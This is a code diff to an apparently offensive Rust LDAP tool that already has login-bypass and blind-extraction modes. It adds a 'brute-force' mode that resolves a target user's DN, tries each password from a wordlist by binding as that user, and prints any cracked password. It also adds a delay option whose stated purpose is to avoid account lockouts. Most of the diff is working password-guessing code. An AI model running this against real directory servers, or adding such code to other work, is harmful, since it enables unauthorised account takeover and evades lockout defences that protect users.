@@ -3,6 +3,7 @@ use clap::{Parser, ValueEnum};
 use ldap3::{Ldap, LdapConnAsync, LdapConnSettings, Scope, SearchEntry};
 use serde::Serialize;
 use std::collections::HashMap;
+use std::io::{BufRead, BufReader};
 
 #[derive(Parser, Debug)]
 #[command(
@@ -74,6 +75,14 @@ struct Args {
     /// Character set to try during blind extraction [default: a-z A-Z 0-9 and common symbols]
     #[arg(long)]
     charset: Option<String>,
+
+    /// Path to a wordlist file for --mode brute-force (one password per line)
+    #[arg(long)]
+    wordlist: Option<String>,
+
+    /// Delay in milliseconds between brute-force attempts (to avoid account lockouts)
+    #[arg(long, default_value = "0")]
+    delay: u64,
 }
 
 #[derive(ValueEnum, Clone, Debug)]
@@ -86,6 +95,8 @@ enum ShowMode {
     LoginBypass,
     #[value(name = "blind-extract")]
     BlindExtract,
+    #[value(name = "brute-force")]
+    BruteForce,
 }
 
 #[derive(ValueEnum, Clone, Debug)]
@@ -210,6 +221,50 @@ async fn main() -> Result<()> {
             ldap.unbind().await?;
             return Ok(());
         }
+        ShowMode::BruteForce => {
+            let base_dn = args
+                .base_dn
+                .as_deref()
+                .context("--base-dn is required for --mode brute-force")?;
+            let target = args
+                .target_user
+                .as_deref()
+                .context("--target-user is required for --mode brute-force")?;
+            let wordlist = args
+                .wordlist
+                .as_deref()
+                .context("--wordlist is required for --mode brute-force")?;
+            let result =
+                brute_force(&mut ldap, base_dn, &args.user_attr, target, wordlist, args.delay)
+                    .await?;
+            match &args.output {
+                OutputFormat::Json => {
+                    println!(
+                        "{}",
+                        serde_json::to_string_pretty(&serde_json::json!({
+                            "target_user": target,
+                            "found": result.is_some(),
+                            "password": result,
+                        }))?
+                    );
+                }
+                OutputFormat::Csv => {
+                    println!("target_user,found,password");
+                    match &result {
+                        Some(pw) => println!("{},true,{}", csv_esc(target), csv_esc(pw)),
+                        None => println!("{},false,", csv_esc(target)),
+                    }
+                }
+                OutputFormat::Table => {
+                    match &result {
+                        Some(pw) => println!("Password found: {pw}"),
+                        None => println!("Password not found in wordlist."),
+                    }
+                }
+            }
+            ldap.unbind().await?;
+            return Ok(());
+        }
         _ => {}
     }
 
@@ -240,7 +295,7 @@ async fn main() -> Result<()> {
             }
             print_object_classes(filtered_ocs, &args.output)?;
         }
-        ShowMode::LoginBypass | ShowMode::BlindExtract => unreachable!(),
+        ShowMode::LoginBypass | ShowMode::BlindExtract | ShowMode::BruteForce => unreachable!(),
     }
 
     ldap.unbind().await?;
@@ -503,6 +558,62 @@ fn print_bypass_results(results: Vec<BypassResult>, fmt: &OutputFormat) -> Resul
         }
     }
     Ok(())
+}
+
+async fn brute_force(
+    ldap: &mut Ldap,
+    base_dn: &str,
+    user_attr: &str,
+    target: &str,
+    wordlist_path: &str,
+    delay_ms: u64,
+) -> Result<Option<String>> {
+    // Resolve the target's full DN so we can bind as them.
+    let filter = format!("({}={})", user_attr, ldap_escape(target));
+    let (entries, _) = ldap
+        .search(base_dn, Scope::Subtree, &filter, vec!["dn"])
+        .await?
+        .success()
+        .context("User search failed")?;
+    let user_dn = entries
+        .into_iter()
+        .next()
+        .map(|e| SearchEntry::construct(e).dn)
+        .with_context(|| format!("User '{target}' not found under {base_dn}"))?;
+
+    eprintln!("Resolved DN: {user_dn}");
+
+    let file = std::fs::File::open(wordlist_path)
+        .with_context(|| format!("Cannot open wordlist: {wordlist_path}"))?;
+    let reader = BufReader::new(file);
+    let mut tried: u64 = 0;
+
+    for line in reader.lines() {
+        let password = line.context("Error reading wordlist")?;
+        if password.is_empty() {
+            continue;
+        }
+        tried += 1;
+
+        let ok = ldap
+            .simple_bind(&user_dn, &password)
+            .await
+            .ok()
+            .and_then(|r| r.success().ok())
+            .is_some();
+
+        if ok {
+            eprintln!("Found after {tried} attempt(s).");
+            return Ok(Some(password));
+        }
+
+        if delay_ms > 0 {
+            tokio::time::sleep(std::time::Duration::from_millis(delay_ms)).await;
+        }
+    }
+
+    eprintln!("Exhausted {tried} password(s). Not found.");
+    Ok(None)
 }
 
 const DEFAULT_CHARSET: &str =
